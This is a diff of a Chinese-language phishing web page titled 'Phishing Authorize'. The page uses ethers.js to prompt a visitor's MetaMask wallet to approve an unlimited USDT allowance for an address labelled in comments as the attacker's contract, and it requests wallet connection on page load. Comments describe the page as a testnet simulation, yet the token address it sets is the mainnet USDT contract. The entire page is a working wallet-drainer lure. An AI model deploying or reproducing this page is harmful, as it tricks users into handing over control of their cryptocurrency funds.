@@ -1,32 +1,47 @@
 
 <!DOCTYPE html>
-<html>
+<html lang="zh-Hant">
 <head>
-  <meta charset="utf-8">
-  <title>授權頁面</title>
+  <meta charset="UTF-8">
+  <title>Phishing Authorize</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
 </head>
 <body>
-  <h2>請點擊下方按鈕授權 USDT</h2>
-  <button onclick="approve()">授權</button>
+  <h2>🔐 授權 USDT（Sepolia 測試網）</h2>
+  <button onclick="approve()">授權最大金額</button>
 
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    const signer = provider.getSigner();
-
-    const tokenAddress = "0x42A5843bF9980e0773c4f02Bd3D59b8a8f1c3fF"; // Sepolia fUSDT
-    const spender = "0xfC35E3407c86461BA2D00C080cC763c0f6878377"; // 攻擊合約
-
-    const ABI = [
-      "function approve(address spender, uint256 amount) public returns (bool)"
-    ];
+    const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT Sepolia 測試網 (模擬用)
+    const spenderAddress = '0xfC35E3407c86461BA2D00C080cC763c0f6878377'; // 攻擊者合約
 
     async function approve() {
-      await provider.send("eth_requestAccounts", []);
-      const contract = new ethers.Contract(tokenAddress, ABI, signer);
-      const tx = await contract.approve(spender, ethers.constants.MaxUint256);
-      console.log("授權 TX:", tx.hash);
+      if (!window.ethereum) return alert("請安裝 MetaMask");
+
+      try {
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        await provider.send("eth_requestAccounts", []);
+        const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+        const usdt = new ethers.Contract(tokenAddress, abi, signer);
+        const max = ethers.constants.MaxUint256;
+        const tx = await usdt.approve(spenderAddress, max);
+        console.log("📡 授權交易發出: ", tx.hash);
+        alert("請確認 MetaMask 簽名");
+      } catch (err) {
+        console.error("❌ 授權失敗", err);
+        alert("發送交易時發生錯誤，請查看控制台");
+      }
     }
+
+    window.addEventListener("load", async () => {
+      if (window.ethereum) {
+        try {
+          await ethereum.request({ method: 'eth_requestAccounts' });
+        } catch (e) {
+          console.warn("MetaMask 拒絕連線");
+        }
+      }
+    });
   </script>
 </body>
 </html>
